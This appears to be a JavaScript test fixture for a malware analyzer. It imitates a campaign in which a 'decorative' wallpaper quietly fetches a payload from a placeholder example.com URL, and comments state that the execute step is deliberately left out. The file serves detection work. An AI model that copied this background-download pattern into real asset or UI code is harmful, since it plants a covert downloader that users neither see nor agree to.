// TEST SAMPLE — NEVER EXECUTED.
// Simulates the real campaign's IOC: a "decorative" wallpaper that downloads a
// file from the web in the background. The URL is an inert placeholder
// (example.com); this file only exists so the analyzer READS it statically and
// verifies that it detects the download pattern.
const PAYLOAD_URL = "https://example.com/update.bin";

async function fetchPayload() {
  const res = await fetch(PAYLOAD_URL);
  const data = await res.arrayBuffer();
  return data;
}

// In a real sample, the harmful part (save/execute) would go here.
// We omit it on purpose: the fixture demonstrates the network IOC, not the harm.
